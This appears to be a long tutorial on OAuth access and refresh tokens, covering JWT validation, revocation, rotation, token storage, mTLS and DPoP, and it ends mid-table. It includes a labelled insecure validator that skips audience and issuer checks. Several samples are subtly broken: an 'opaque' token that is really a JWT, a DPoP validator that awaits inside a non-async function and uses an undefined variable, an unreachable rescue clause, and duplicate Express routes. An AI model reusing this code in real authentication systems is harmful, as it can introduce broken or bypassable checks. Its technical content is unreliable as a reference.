# Access and Refresh Tokens: Complete Backend Developer's Guide

> **📚 Comprehensive Deep-Dive Tutorial** | **⏱️ Reading Time:** 25-30 minutes | **🎯 Level:** Intermediate

---

## Table of Contents

1. [Introduction](#introduction)
2. [Prerequisites](#prerequisites)
3. [Learning Objectives](#learning-objectives)
4. [The Fundamental Problem](#the-fundamental-problem)
5. [Part 1: Access Tokens](#part-1-access-tokens)
6. [Part 2: Refresh Tokens](#part-2-refresh-tokens)
7. [Part 3: Strategic Decisions](#part-3-strategic-decisions)
8. [Implementation Guide](#implementation-guide)
9. [Real-World Use Cases](#real-world-use-cases)
10. [Common Pitfalls & Troubleshooting](#common-pitfalls--troubleshooting)
11. [Best Practices](#best-practices)
12. [Anti-Patterns](#anti-patterns)
13. [Performance Considerations](#performance-considerations)
14. [Security Considerations](#security-considerations)
15. [Testing Strategies](#testing-strategies)
16. [Practice Exercises](#practice-exercises)
17. [Test Your Understanding](#test-your-understanding)
18. [Common Interview Questions](#common-interview-questions)
19. [Question Bank](#question-bank)
20. [Summary & Key Takeaways](#summary--key-takeaways)
21. [Further Reading & Resources](#further-reading--resources)

---

## Introduction

Almost every API authenticates requests with a short string in an Authorization header. The mechanism is simple enough to implement in an afternoon, which is exactly why it is so often implemented incorrectly. The subtle part is not issuing tokens; it is understanding why there are two of them, and what each one is allowed to assume.

### The Core Insight

> **💡 Key Insight:** A credential cannot be both cheap to verify and cheap to revoke. OAuth 2.0 doesn't solve this conflict—it splits it in two.

- **Access Token:** Short-lived, sent on every request, designed for fast local verification
- **Refresh Token:** Long-lived, sent rarely, designed for controlled renewal

One credential proves the holder may act right now. The other proves the holder may come back and ask to act again. Everything below follows from that division.

### Why This Matters

In modern distributed systems, understanding token-based authentication is not optional—it's critical. A single implementation mistake can lead to:
- 🔴 Security vulnerabilities (token theft, replay attacks)
- 🔴 Performance bottlenecks (unnecessary network calls)
- 🔴 Poor user experience (frequent logouts, slow responses)
- 🔴 Scalability issues (shared state dependencies)

---

## Prerequisites

Before diving into this tutorial, you should have:

### Required Knowledge
- ✅ Basic understanding of HTTP and REST APIs
- ✅ Familiarity with authentication concepts (sessions, cookies)
- ✅ Basic understanding of cryptography (signing, encryption)
- ✅ Familiarity with JSON Web Tokens (JWT) structure

### Recommended Knowledge
- 📖 OAuth 2.0 framework basics
- 📖 Understanding of public/private key cryptography
- 📖 Basic knowledge of distributed systems concepts

### Tools Needed
- 🔧 A code editor (VS Code, IntelliJ, etc.)
- 🔧 Postman or similar API testing tool
- 🔧 Ruby/Python/Node.js runtime (for code examples)
- 🔧 JWT library for your language of choice

---

## Learning Objectives

By the end of this tutorial, you will be able to:

### Core Competencies
- ✅ Explain the fundamental trade-off between verification cost and revocation speed
- ✅ Implement secure JWT validation with proper claim verification
- ✅ Design and implement refresh token rotation systems
- ✅ Choose between local verification and introspection appropriately
- ✅ Identify and avoid common security pitfalls in token-based auth
- ✅ Implement proper token storage strategies for different platforms
- ✅ Build production-ready authentication flows with proper error handling

### Advanced Skills
- 🎯 Implement sender-constrained tokens (DPoP, mTLS)
- 🎯 Design token revocation strategies
- 🎯 Optimize token lifetimes for security vs. performance
- 🎯 Implement reuse detection and attack response
- 🎯 Migrate from session-based to token-based authentication

---

## The Fundamental Problem

### The Impossible Triangle

```mermaid
graph TD
    A[Token Properties] --> B[Cheap to Verify]
    A --> C[Cheap to Revoke]
    A --> D[Long Lifespan]
    
    B -.->|Conflicts with| C
    C -.->|Conflicts with| D
    D -.->|Conflicts with| B
    
    style B fill:#e1f5ff
    style C fill:#ffe1e1
    style D fill:#e1ffe1
    style A fill:#fff4e1
```

**The Problem:** You can only pick two of these three properties:

1. **Cheap to Verify + Long Lifespan** = JWT (but revocation is hard)
2. **Cheap to Revoke + Long Lifespan** = Session cookies (but verification requires DB lookup)
3. **Cheap to Verify + Cheap to Revoke** = Short-lived tokens only (poor UX)

### OAuth 2.0's Solution: Split the Token

```mermaid
sequenceDiagram
    participant C as Client
    participant AS as Authorization Server
    participant RS as Resource Server
    
    Note over C,RS: The Two-Token Solution
    
    C->>AS: Authenticate + Request Tokens
    AS->>C: Access Token (short-lived) + Refresh Token (long-lived)
    
    loop Every API Request
        C->>RS: Request with Access Token
        RS->>RS: Local verification (cheap, fast)
        RS->>C: Response
    end
    
    C->>AS: Access Token expired? Refresh with Refresh Token
    AS->>AS: Verify Refresh Token (with state check)
    AS->>C: New Access Token + New Refresh Token
    
    Note over C,RS: Access: Fast verification<br/>Refresh: Controlled renewal with state
```

**The Strategy:**
- **Access Token:** Validates quickly (local JWT verification), expires quickly (limits damage)
- **Refresh Token:** Validates slowly (server-side state check), lives longer (good UX)

---

## Part 1: Access Tokens

### What is an Access Token?

An access token is a **bearer token**—whoever presents it gets the access it represents, with no further proof of identity. The resource server doesn't ask who is speaking; it asks only whether the string is currently valid and whether its scope covers the requested operation.

### The Threat Model

```mermaid
graph LR
    A[Attacker] -->|Steals| B[Access Token]
    B -->|Presents to| C[Resource Server]
    C -->|Accepts if valid| D[Unauthorized Access]
    
    E[Defenses] --> F[Short Lifetime]
    E --> G[Narrow Scope]
    E --> H[Audience Checking]
    E --> I[Revocation Lists]
    
    F -->|Limits| D
    G -->|Limits| D
    H -->|Prevents| D
    I -->|Prevents| D
    
    style A fill:#ffe1e1
    style D fill:#ffe1e1
    style E fill:#e1ffe1
```

**Critical Understanding:** A leaked bearer token is indistinguishable from a legitimate request until it expires or is revoked.

### Token Formats: Opaque vs JWT

#### Comparison Table

| Aspect | Opaque Token | JWT (RFC 9068) |
|--------|--------------|----------------|
| **Format** | Random identifier | Base64url-encoded JSON |
| **Verification** | Requires introspection endpoint | Local signature verification |
| **Information** | No intrinsic meaning | Contains claims (iss, exp, aud, etc.) |
| **Size** | Small (32-40 chars) | Larger (200-2000 chars) |
| **Performance** | Network call required | No network call needed |
| **Revocation** | Easy (delete from DB) | Hard (need denylist) |
| **Debugging** | Difficult | Easy (decode payload) |

#### Opaque Token Example

```ruby
# Opaque token - just a random string
opaque_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"

# To validate, must call introspection endpoint
response = HTTP.post(
  "https://auth.example.com/oauth2/introspect",
  form: {
    token: opaque_token,
    client_id: "api_client",
    client_secret: "secret"
  }
)

if response.parse["active"]
  # Token is valid, check scopes
  scopes = response.parse["scope"].split
end
```

#### JWT Structure

```mermaid
graph TD
    A[JWT Token] --> B[Header]
    A --> C[Payload]
    A --> D[Signature]
    
    B --> B1[alg: RS256]
    B --> B2[typ: JWT]
    B --> B3[kid: key-id-123]
    
    C --> C1[iss: auth.example.com]
    C --> C2[sub: user-456]
    C --> C3[aud: api.example.com]
    C --> C4[exp: 1704067200]
    C --> C5[iat: 1704063600]
    C --> C6[jti: unique-id-789]
    C --> C7[scope: read write]
    
    D --> D1[Signed with private key]
    D1 --> D2[Verified with public key]
    
    style A fill:#fff4e1
    style B fill:#e1f5ff
    style C fill:#e1ffe1
    style D fill:#ffe1e1
```

### JWT Validation: The Critical Steps

#### ⚠️ The #1 Mistake: Decoding ≠ Validating

```mermaid
graph LR
    A[JWT Token] --> B[Base64 Decode]
    B --> C[Read Payload]
    C --> D[Claims Visible]
    
    E[Validation] --> F[Verify Signature]
    E --> G[Check Issuer]
    E --> H[Check Audience]
    E --> I[Check Expiration]
    E --> J[Check Scope]
    
    style D fill:#ffe1e1
    style E fill:#e1ffe1
```

**Critical Point:** Anyone can decode a JWT and read its claims. Validation requires cryptographic verification.

#### ❌ Vulnerable Implementation (DON'T DO THIS)

```ruby
# BEFORE - Vulnerable: verifies signature, ignores audience
def current_scopes(token, public_key)
  claims, _ = JWT.decode(token, public_key, true, algorithm: "RS256")
  claims["scope"].to_s.split
  
  # ❌ PROBLEM: A token minted for aud: "search-api" 
  # is accepted here in the admin API!
end
```

**What's Wrong:**
1. No audience verification (token for search-api accepted by admin-api)
2. Algorithm not pinned (header alg could be manipulated)
3. No issuer verification
4. No error handling

#### ✅ Secure Implementation (DO THIS)

```ruby
require "jwt"

# Service-specific constant - NEVER from token
ADMIN_API_AUDIENCE = "admin-api"
EXPECTED_ISSUER = "https://auth.example.com"

def validate_token!(token, jwks)
  # Step 1: Decode header (unverified) to get key ID
  header = JWT.decode(token, nil, false).last
  kid = header["kid"]
  
  # Step 2: Resolve signing key from JWKS
  jwk = jwks.fetch_key(kid)
  public_key = JWT::JWK.import(jwk).public_key
  
  # Step 3: Verify with ALL claims checked
  claims, _ = JWT.decode(
    token,
    public_key,
    true,  # Verify signature
    
    # CRITICAL: Pin algorithm, don't trust header
    algorithm: "RS256",
    
    # Verify issuer
    iss: EXPECTED_ISSUER,
    verify_iss: true,
    
    # Verify audience - pinned to THIS service
    aud: ADMIN_API_AUDIENCE,
    verify_aud: true,
    
    # Verify expiration
    verify_expiration: true,
    
    # Verify not before (if present)
    verify_not_before: true
  )
  
  # Step 4: Additional custom validations
  validate_scope!(claims["scope"])
  check_token_not_revoked(claims["jti"])
  
  claims
  
rescue JWT::DecodeError => e
  raise AuthenticationError, "Token validation failed: #{e.message}"
rescue JWT::InvalidAudError
  raise AuthenticationError, "Token was not issued for this API"
end

def validate_scope!(scope_string)
  required_scopes = %w[admin:write admin:read]
  token_scopes = scope_string.to_s.split
  
  required_scopes.each do |required|
    unless token_scopes.include?(required)
      raise AuthorizationError, "Missing required scope: #{required}"
    end
  end
end
```

#### Java Implementation

```java
import com.nimbusds.jwt.*;
import com.nimbusds.jwt.proc.*;
import com.nimbusds.jose.*;
import com.nimbusds.jose.crypto.*;
import com.nimbusds.jose.jwk.*;
import java.time.Instant;

public class TokenValidator {
    
    private static final String EXPECTED_ISSUER = "https://auth.example.com";
    private static final String EXPECTED_AUDIENCE = "admin-api";
    private static final String EXPECTED_ALGORITHM = "RS256";
    
    public JWTClaimsSet validateToken(String token, JWKSet jwks) 
            throws InvalidTokenException {
        
        try {
            // Parse token
            JWT jwt = JWTParser.parse(token);
            
            // Step 1: Verify signature
            JWSHeader header = jwt.getHeader();
            JWK jwk = jwks.getJWKByKeyId(header.getKeyID());
            
            if (jwk == null) {
                throw new InvalidTokenException("Unknown key ID: " + header.getKeyID());
            }
            
            JWSVerifier<JWSHeader> verifier = new RSASSAVerifier(
                ((RSAKey) jwk).toRSAPublicKey()
            );
            
            if (!jwt.verify(verifier)) {
                throw new InvalidTokenException("Invalid signature");
            }
            
            // Step 2: Validate claims
            JWTClaimsSet claims = jwt.getJWTClaimsSet();
            
            // Verify issuer
            if (!EXPECTED_ISSUER.equals(claims.getIssuer())) {
                throw new InvalidTokenException("Invalid issuer");
            }
            
            // Verify audience
            if (!claims.getAudience().contains(EXPECTED_AUDIENCE)) {
                throw new InvalidTokenException("Invalid audience");
            }
            
            // Verify expiration
            Instant expiration = claims.getExpirationTime().toInstant();
            if (Instant.now().isAfter(expiration)) {
                throw new InvalidTokenException("Token expired");
            }
            
            // Verify not before
            if (claims.getNotBeforeTime() != null) {
                Instant notBefore = claims.getNotBeforeTime().toInstant();
                if (Instant.now().isBefore(notBefore)) {
                    throw new InvalidTokenException("Token not yet valid");
                }
            }
            
            return claims;
            
        } catch (ParseException e) {
            throw new InvalidTokenException("Malformed token", e);
        }
    }
}
```

### Key Validation Claims Explained

#### 1. `iss` (Issuer)
- **Purpose:** Identifies who issued the token
- **Why it matters:** Prevents tokens from other authorization servers being accepted
- **Validation:** Must match your expected issuer exactly

#### 2. `aud` (Audience)
- **Purpose:** Identifies intended recipient
- **Why it matters:** Prevents token reuse across different APIs
- **Validation:** Must match THIS service's identifier (hardcoded constant)

#### 3. `exp` (Expiration)
- **Purpose:** Token expiration timestamp
- **Why it matters:** Limits damage from stolen tokens
- **Validation:** Must be in the future (with clock skew tolerance)

#### 4. `scope` (Scope)
- **Purpose:** Defines permitted actions
- **Why it matters:** Enforces least privilege
- **Validation:** Must include required scopes for requested operation

#### 5. `jti` (JWT ID)
- **Purpose:** Unique token identifier
- **Why it matters:** Enables revocation tracking
- **Validation:** Check against revocation denylist

#### 6. `sub` (Subject)
- **Purpose:** Identifies the user/principal
- **Why it matters:** Links token to specific user
- **Validation:** Extract for authorization decisions

### Local Verification vs Introspection

```mermaid
graph TD
    A[Token Received] --> B{Verification Strategy?}
    
    B -->|Local Verification| C[Verify Signature Locally]
    C --> D[Check Claims]
    D --> E{Valid?}
    E -->|Yes| F[Allow Request]
    E -->|No| G[Deny Request]
    
    B -->|Introspection| H[Call Introspection Endpoint]
    H --> I[Authorization Server Checks]
    I --> J{Active?}
    J -->|Yes| K[Return Token Metadata]
    J -->|No| L[Return Inactive]
    K --> M{Valid?}
    M -->|Yes| F
    M -->|No| G
    L --> G
    
    style C fill:#e1ffe1
    style H fill:#fff4e1
    style F fill:#e1ffe1
    style G fill:#ffe1e1
```

#### Comparison Matrix

| Aspect | Local Verification | Introspection (RFC 7662) |
|--------|-------------------|-------------------------|
| **Speed** | ⚡⚡⚡ Fast (no network) | 🐌 Slow (network call) |
| **Revocation** | ❌ Not possible (until exp) | ✅ Immediate |
| **Scalability** | ✅ Excellent (no shared state) | ❌ Auth server in hot path |
| **Complexity** | ✅ Simple (just public key) | ❌ Complex (endpoint + state) |
| **Use Case** | Most APIs | High-security, immediate revocation needed |

#### Middle Ground: Denylist Pattern

```ruby
class TokenValidator
  def initialize(redis_client, jwks)
    @redis = redis_client
    @jwks = jwks
  end
  
  def validate(token)
    claims = verify_jwt_locally(token)
    
    # Check if token was revoked
    jti = claims["jti"]
    if @redis.exists?("revoked_token:#{jti}")
      raise AuthenticationError, "Token has been revoked"
    end
    
    claims
  end
  
  def revoke(jti, ttl: 3600)
    # Add to denylist with TTL matching token expiration
    @redis.setex("revoked_token:#{jti}", ttl, "1")
  end
end
```

**Trade-off:** Most tokens aren't revoked, so most requests stay fast. But you still have shared mutable state.

### Token Lifetime: Finding the Sweet Spot

```mermaid
graph LR
    A[Token Lifetime] --> B{Shorter}
    A --> C{Longer}
    
    B --> D[Pros]
    B --> E[Cons]
    C --> F[Pros]
    C --> G[Cons]
    
    D --> D1[Less damage if stolen]
    D --> D2[Faster revocation]
    E --> E1[More refresh calls]
    E --> E2[Poor UX]
    E --> E3[More server load]
    
    F --> F1[Better UX]
    F --> F2[Fewer refresh calls]
    G --> G1[More damage if stolen]
    G --> G2[Slower revocation]
    
    style A fill:#fff4e1
    style D fill:#e1ffe1
    style E fill:#ffe1e1
    style F fill:#e1ffe1
    style G fill:#ffe1e1
```

#### Recommended Lifetimes

| Token Type | Recommended Lifetime | Rationale |
|------------|---------------------|-----------|
| **Access Token** | 5-15 minutes | Balance security and refresh overhead |
| **Refresh Token** | 24 hours - 7 days | Depends on security requirements |
| **Idle Timeout** | 1-24 hours | Reset on each use |
| **Absolute Max** | 30-90 days | Hard limit regardless of activity |

#### Calculating Optimal Lifetime

```ruby
def calculate_access_token_lifetime(api_sensitivity, refresh_cost)
  # Higher sensitivity = shorter lifetime
  # Higher refresh cost = longer lifetime
  
  base_lifetime = 900 # 15 minutes
  
  sensitivity_multiplier = case api_sensitivity
    when :high then 0.5      # 7.5 minutes
    when :medium then 1.0    # 15 minutes
    when :low then 2.0       # 30 minutes
  end
  
  refresh_penalty = case refresh_cost
    when :high then 1.5      # Network latency concern
    when :medium then 1.0    # Normal
    when :low then 0.7       # Cheap to refresh
  end
  
  (base_lifetime * sensitivity_multiplier * refresh_penalty).round
end
```

---

## Part 2: Refresh Tokens

### What is a Refresh Token?

A refresh token lets a client get a new access token without sending the user back through login. The client posts it to the token endpoint with `grant_type=refresh_token` and receives a new access token, normally along with a new refresh token.

### Critical Security Property

> **🔒 Key Security Principle:** The refresh token travels ONLY between the client and authorization server, NEVER to a resource server.

The credential capable of minting new access tokens is shown only to the party that issued it, no matter how many APIs the resulting access tokens are used against.

```mermaid
graph LR
    A[Client] -->|1. Refresh Request| B[Authorization Server]
    B -->|2. New Tokens| A
    A -->|3. API Request with Access Token| C[Resource Server 1]
    A -->|4. API Request with Access Token| D[Resource Server 2]
    A -->|5. API Request with Access Token| E[Resource Server N]
    
    F[Refresh Token] -.->|NEVER sent to| C
    F -.->|NEVER sent to| D
    F -.->|NEVER sent to| E
    
    style F fill:#ffe1e1
    style B fill:#e1ffe1
```

### Refresh Token Rotation (RFC 9700)

#### The Concept

Each use of a refresh token issues a new one and immediately invalidates the presented one. Refresh tokens become **single-use**.

#### Why Rotation Matters

```mermaid
sequenceDiagram
    participant AT as Attacker
    participant AS as Auth Server
    participant LC as Legitimate Client
    
    Note over AT,LC: Token Theft Scenario
    
    AT->>AS: Present stolen refresh token (use #1)
    AS->>AS: Invalidate old token, issue new token (A)
    AS->>AT: New refresh token (A)
    
    LC->>AS: Present same refresh token (use #2 - retry)
    AS->>AS: Token already invalidated!
    AS->>AS: ⚠️ REUSE DETECTED
    
    Note over AS: Security Event Triggered
    
    AS->>AS: Revoke entire token family
    AS->>LC: Reject - force re-authentication
    AS->>AT: Reject
    
    Note over AT,LC: Attack stopped, legitimate user<br/>must re-authenticate
```

**The Value:** A stale token reveals compromise when presented. The server knows with certainty that a compromise occurred because one lineage should never fork into two independent users.

#### Implementation: Rotation with Grace Period

```ruby
class RefreshTokenService
  GRACE_PERIOD = 5 # seconds
  
  def rotate(refresh_token, client_info)
    # Find the token in database
    stored_token = RefreshToken.find_by(token: hash_token(refresh_token))
    
    unless stored_token
      # Check if this is a reuse attempt
      handle_potential_reuse(refresh_token, client_info)
      raise AuthenticationError, "Invalid refresh token"
    end
    
    # Check if within grace period (for network retries)
    if stored_token.rotated_at && 
       stored_token.rotated_at > Time.now - GRACE_PERIOD
      
      # Return the same new tokens from the first request
      return {
        access_token: stored_token.last_access_token,
        refresh_token: stored_token.last_refresh_token,
        expires_in: 900
      }
    end
    
    # Generate new tokens
    new_access_token = generate_access_token(stored_token.user)
    new_refresh_token = generate_refresh_token(stored_token.user)
    
    # Invalidate old token
    stored_token.update!(
      rotated_at: Time.now,
      invalidated: true
    )
    
    # Store new token
    new_token = RefreshToken.create!(
      user: stored_token.user,
      token: hash_token(new_refresh_token),
      last_access_token: new_access_token,
      last_refresh_token: new_refresh_token,
      expires_at: Time.now + 7.days
    )
    
    {
      access_token: new_access_token,
      refresh_token: new_refresh_token,
      expires_in: 900
    }
  end
  
  def handle_potential_reuse(presented_token, client_info)
    # Log security event
    SecurityEvent.create!(
      event_type: "refresh_token_reuse",
      severity: "critical",
      client_info: client_info,
      presented_token: hash_token(presented_token),
      detected_at: Time.now
    )
    
    # Revoke entire token family
    user = identify_token_family(presented_token)
    if user
      RefreshToken.where(user: user).update_all(
        invalidated: true,
        revoked_at: Time.now,
        revocation_reason: "reuse_detected"
      )
      
      # Optional: Force password reset
      user.update!(force_password_reset: true)
    end
    
    # Alert security team
    SecurityAlert.notify(
      severity: "critical",
      message: "Refresh token reuse detected - possible token theft",
      user_id: user&.id,
      client_info: client_info
    )
  end
end
```

#### Client-Side: Single-Flight Refresh

```ruby
require "monitor"

class TokenCache
  include MonitorMixin
  
  SKEW = 30 # seconds - absorb clock drift
  
  def initialize(token_refresh_client)
    super()
    @client = token_refresh_client
    @access_token = nil
    @refresh_token = nil
    @expires_at = Time.at(0)
    @refresh_in_progress = false
  end
  
  def access_token
    synchronize do
      # Return cached token if still valid
      return @access_token if valid?
      
      # If refresh already in progress, wait for it
      if @refresh_in_progress
        # Wait up to 5 seconds for refresh to complete
        wait_until = Time.now + 5
        while Time.now < wait_until && @refresh_in_progress
          wait(100) # Wait 100ms
        end
        
        return @access_token if valid?
        raise AuthenticationError, "Refresh timeout"
      end
      
      # Perform refresh
      @refresh_in_progress = true
      begin
        refresh!
        @access_token
      ensure
        @refresh_in_progress = false
        broadcast # Wake up waiting threads
      end
    end
  end
  
  private
  
  def valid?
    @access_token && Time.now < @expires_at - SKEW
  end
  
  def refresh!
    res = @client.refresh(@refresh_token)
    
    @access_token = res.fetch(:access_token)
    @refresh_token = res.fetch(:refresh_token)
    @expires_at = Time.now + res.fetch(:expires_in)
    
    # Store refresh token securely (keychain, encrypted storage, etc.)
    store_refresh_token(@refresh_token)
  end
end

# Usage
class ApiClient
  def initialize(credentials)
    @token_cache = TokenCache.new(self)
    @credentials = credentials
  end
  
  def refresh(refresh_token)
    response = HTTP.post(
      "https://auth.example.com/oauth2/token",
      form: {
        grant_type: "refresh_token",
        refresh_token: refresh_token,
        client_id: @credentials.client_id
      }
    )
    
    if response.status == 200
      response.parse.symbolize_keys
    else
      raise AuthenticationError, "Refresh failed"
    end
  end
  
  def get(url)
    token = @token_cache.access_token
    
    response = HTTP.auth("Bearer #{token}").get(url)
    
    if response.status == 401
      # Refresh once, retry once
      @token_cache.refresh!
      response = HTTP.auth("Bearer #{@token_cache.access_token}").get(url)
      
      if response.status == 401
        # Real auth error, not expired token
        raise AuthenticationError, "Unauthorized"
      end
    end
    
    response
  end
end
```

### Token Storage Strategies

#### Browser-Based Applications

```mermaid
graph TD
    A[Token Storage Options] --> B[localStorage]
    A --> C[sessionStorage]
    A --> D[HttpOnly Cookie]
    A --> E[IndexedDB]
    
    B --> F[XSS Risk: HIGH]
    B --> G[CSRF Risk: LOW]
    B --> H[Easy Access]
    
    C --> I[XSS Risk: HIGH]
    C --> J[CSRF Risk: LOW]
    C --> K[Cleared on Tab Close]
    
    D --> L[XSS Risk: LOW]
    D --> M[CSRF Risk: HIGH]
    D --> N[Requires CSRF Protection]
    
    E --> O[XSS Risk: HIGH]
    E --> P[CSRF Risk: LOW]
    E --> Q[Persistent]
    
    style D fill:#e1ffe1
    style B fill:#ffe1e1
    style C fill:#ffe1e1
    style E fill:#ffe1e1
```

**✅ Recommended: HttpOnly Cookies**

```javascript
// Server sets cookie with proper flags
app.post('/oauth2/token', (req, res) => {
  const { access_token, refresh_token } = generateTokens(user);
  
  // Set refresh token as HttpOnly cookie
  res.cookie('refresh_token', refresh_token, {
    httpOnly: true,      // Not accessible via JavaScript
    secure: true,        // HTTPS only
    sameSite: 'strict',  // CSRF protection
    path: '/oauth2/token', // Only sent to token endpoint
    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
  });
  
  // Return access token in response body
  res.json({
    access_token,
    token_type: 'Bearer',
    expires_in: 900
  });
});

// Refresh endpoint automatically includes cookie
app.post('/oauth2/token', async (req, res) => {
  const refresh_token = req.cookies.refresh_token;
  
  if (!refresh_token) {
    return res.status(401).json({ error: 'No refresh token' });
  }
  
  // Process refresh...
});
```

**❌ Avoid: localStorage**

```javascript
// ❌ DANGEROUS - vulnerable to XSS
localStorage.setItem('access_token', access_token);
localStorage.setItem('refresh_token', refresh_token);

// Any XSS vulnerability can steal these tokens
// One XSS bug = full account takeover
```

#### Native/Mobile Applications

```swift
// iOS - Keychain
import Security

class TokenStorage {
  func storeRefreshToken(_ token: String) throws {
    let query: [String: Any] = [
      kSecClass as String: kSecClassGenericPassword,
      kSecAttrAccount as String: "refresh_token",
      kSecValueData as String: token.data(using: .utf8)!,
      kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly
    ]
    
    // Delete existing item
    SecItemDelete(query as CFDictionary)
    
    // Add new item
    let status = SecItemAdd(query as CFDictionary, nil)
    guard status == errSecSuccess else {
      throw TokenStorageError.failedToStore
    }
  }
  
  func retrieveRefreshToken() throws -> String {
    let query: [String: Any] = [
      kSecClass as String: kSecClassGenericPassword,
      kSecAttrAccount as String: "refresh_token",
      kSecReturnData as String: true
    ]
    
    var result: AnyObject?
    let status = SecItemCopyMatching(query as CFDictionary, &result)
    
    guard status == errSecSuccess,
          let data = result as? Data,
          let token = String(data: data, encoding: .utf8) else {
      throw TokenStorageError.failedToRetrieve
    }
    
    return token
  }
}
```

```java
// Android - Keystore
import android.security.keystore.*;

public class TokenStorage {
    private static final String KEY_ALIAS = "refresh_token_key";
    private static final String ANDROID_KEYSTORE = "AndroidKeyStore";
    
    public void storeRefreshToken(Context context, String token) throws Exception {
        KeyStore keyStore = KeyStore.getInstance(ANDROID_KEYSTORE);
        keyStore.load(null);
        
        // Generate key if not exists
        if (!keyStore.containsAlias(KEY_ALIAS)) {
            KeyGenerator keyGenerator = KeyGenerator.getInstance(
                KeyProperties.KEY_ALGORITHM_AES, 
                ANDROID_KEYSTORE
            );
            
            keyGenerator.init(new KeyGenParameterSpec.Builder(
                KEY_ALIAS,
                KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT
            )
            .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
            .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
            .build());
            
            keyGenerator.generateKey();
        }
        
        // Encrypt and store
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        SecretKey secretKey = ((KeyStore.SecretKeyEntry) keyStore.getEntry(KEY_ALIAS, null)).getSecretKey();
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);
        
        byte[] encryptedToken = cipher.doFinal(token.getBytes());
        // Store encryptedToken in SharedPreferences
    }
}
```

#### Server-Side Storage

```ruby
# Store refresh tokens hashed (like passwords)
class RefreshToken < ApplicationRecord
  before_create :hash_token
  
  def hash_token
    self.token_hash = BCrypt::Password.create(self.token)
  end
  
  def self.find_valid(token)
    # Find by comparing hash
    all.each do |stored_token|
      if BCrypt::Password.new(stored_token.token_hash) == token
        return stored_token unless stored_token.invalidated?
      end
    end
    nil
  end
end

# ❌ NEVER store tokens in plaintext
# ❌ NEVER log token values
# ❌ NEVER include tokens in error messages

# ✅ DO: Hash tokens
# ✅ DO: Log only token IDs (jti)
# ✅ DO: Use prepared statements to prevent SQL injection
```

### Sender-Constrained Tokens (Advanced)

#### Mutual TLS (mTLS)

```mermaid
sequenceDiagram
    participant C as Client
    participant AS as Auth Server
    participant RS as Resource Server
    
    C->>AS: 1. Request token with client certificate
    AS->>AS: 2. Verify client certificate
    AS->>C: 3. Issue token bound to certificate thumbprint
    
    C->>RS: 4. Request with token + client certificate
    RS->>RS: 5. Verify token signature
    RS->>RS: 6. Verify certificate thumbprint matches token binding
    RS->>C: 7. Response
    
    Note over C,RS: Stolen token is useless without<br/>the client's private key
```

**Implementation:**

```ruby
# Token issuance with mTLS binding
def issue_token_with_mtls(client_cert, user)
  cert_thumbprint = OpenSSL::Digest::SHA256.new(client_cert.to_der).hexdigest
  
  claims = {
    iss: ISSUER,
    sub: user.id,
    aud: "api.example.com",
    exp: 15.minutes.from_now.to_i,
    iat: Time.now.to_i,
    jti: SecureRandom.uuid,
    scope: user.scopes,
    cnf: {
      x5t: cert_thumbprint  # Certificate thumbprint binding
    }
  }
  
  JWT.encode(claims, private_key, "RS256")
end

# Token validation with mTLS check
def validate_token_with_mtls(token, client_cert)
  claims = validate_jwt(token)
  
  # Verify certificate binding
  cert_thumbprint = OpenSSL::Digest::SHA256.new(client_cert.to_der).hexdigest
  token_thumbprint = claims.dig("cnf", "x5t")
  
  unless secure_compare(cert_thumbprint, token_thumbprint)
    raise AuthenticationError, "Token not bound to client certificate"
  end
  
  claims
end
```

#### DPoP (Demonstrating Proof-of-Possession)

```javascript
// Client-side DPoP proof generation
async function createDPoPProof(method, url, accessToken) {
  const privateKey = await crypto.subtle.generateKey(
    {
      name: "ECDSA",
      namedCurve: "P-256"
    },
    true,
    ["sign", "verify"]
  );
  
  const payload = {
    htm: method,  // HTTP method
    htu: url,     // Target URI
    jti: crypto.randomUUID(),
    ath: base64url(await crypto.subtle.digest(
      "SHA-256",
      new TextEncoder().encode(accessToken)
    ))
  };
  
  const signature = await crypto.subtle.sign(
    {
      name: "ECDSA",
      hash: "SHA-256"
    },
    privateKey.privateKey,
    new TextEncoder().encode(JSON.stringify(payload))
  );
  
  const header = {
    typ: "dpop+jwt",
    alg: "ES256",
    jwk: await exportPublicKey(privateKey.publicKey)
  };
  
  return base64url(JSON.stringify(header)) + "." + 
         base64url(JSON.stringify(payload)) + "." + 
         base64url(signature);
}

// Server-side validation
function validateDPoP(dpopProof, accessToken, method, url) {
  const { header, payload } = decodeJWT(dpopProof);
  
  // Verify HTTP method
  if (payload.htm !== method) {
    throw new Error("Invalid HTTP method in DPoP");
  }
  
  // Verify target URI
  if (payload.htu !== url) {
    throw new Error("Invalid URL in DPoP");
  }
  
  // Verify access token hash
  const tokenHash = base64url(
    crypto.subtle.digest("SHA-256", new TextEncoder().encode(accessToken))
  );
  if (payload.ath !== tokenHash) {
    throw new Error("Invalid access token binding");
  }
  
  // Verify signature
  const publicKey = importJWK(header.jwk);
  const signatureValid = await crypto.subtle.verify(
    {
      name: "ECDSA",
      hash: "SHA-256"
    },
    publicKey,
    base64urlToArrayBuffer(signature),
    new TextEncoder().encode(JSON.stringify(payload))
  );
  
  if (!signatureValid) {
    throw new Error("Invalid DPoP signature");
  }
  
  return { publicKey, payload };
}
```

---

## Part 3: Strategic Decisions

### Do You Even Need the Token Pair?

```mermaid
graph TD
    A[Authentication Needs] --> B{Single First-Party App?}
    
    B -->|Yes| C[Use Session Cookies]
    B -->|No| D{Multiple Resource Servers?}
    
    D -->|Yes| E[Use Token Pair]
    D -->|No| F{Third-Party Clients?}
    
    F -->|Yes| E
    F -->|No| C
    
    G[Session Cookies Benefits] --> G1[Simple]
    G --> G2[Revocable]
    G --> G3[No JWT complexity]
    
    H[Token Pair Benefits] --> H1[Cross-domain]
    H --> H2[No shared session store]
    H --> H3[Native/mobile support]
    
    style C fill:#e1ffe1
    style E fill:#fff4e1
```

**Decision Matrix:**

| Scenario | Recommended Approach | Rationale |
|----------|---------------------|-----------|
| Single web app, own backend | Session cookies | Simpler, revocable, well-understood |
| Multiple microservices | Token pair | No shared session store needed |
